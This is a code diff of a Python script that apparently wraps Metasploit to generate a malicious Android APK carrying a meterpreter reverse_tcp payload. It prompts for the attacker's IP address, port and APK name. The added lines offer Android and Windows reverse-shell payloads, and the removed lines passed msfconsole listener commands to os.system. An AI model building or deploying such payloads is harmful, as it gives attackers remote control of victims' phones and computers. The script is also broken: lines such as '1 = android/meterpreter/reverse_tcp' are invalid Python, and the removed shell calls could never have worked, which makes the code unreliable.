@@ -1,6 +1,10 @@
 import os
 
-Android_payload = input("Enter the payload - ",)
+1 = android/meterpreter/reverse_tcp
+2 = windows/meterpreter/reverse_tcp
+print("available payloads:", 1)
+print("available payloads:", 2)
+Android_payload = input("Enter the payload - 1 or 2: ",)
 lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
 apk_name = input("Enter apk name - ",)
@@ -14,9 +18,3 @@ def payload():
     else:
         print("Wrong syntax")
 payload()
-
-os.system("use exploit/multi/handler")
-os.system("use android/meterpreter/reverse_tcp")
-os.system("set lhost "+lhost)
-os.system("set lport "+lport)
-os.system("exploit")
